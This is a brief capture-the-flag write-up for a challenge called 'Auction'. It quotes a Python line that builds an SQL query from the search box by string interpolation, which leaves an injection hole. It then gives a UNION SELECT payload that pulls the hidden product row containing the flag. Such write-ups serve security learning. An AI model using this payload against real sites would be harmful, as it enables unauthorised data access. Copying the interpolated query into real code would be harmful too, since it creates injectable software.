# Auction

This challenge is a UNION-based SQL injection through the search box.

The vulnerable query is:

```python
sql_query = f"SELECT id, name, price, ends, description, image, hidden FROM product WHERE hidden = 0 AND name LIKE '%{search_term}%' ORDER BY id"
```

The flag is stored in the hidden product name. So the idea is simple:

1. Inject a `UNION SELECT` into the search box.
2. Return the hidden row in the same 7 columns.
3. Read the flag directly from the results.

The payload can be:

```sql
' UNION SELECT id, name, price, ends, description, image, hidden FROM product WHERE hidden = 1-- 
```

That makes the hidden row appear in the table, including the flag.
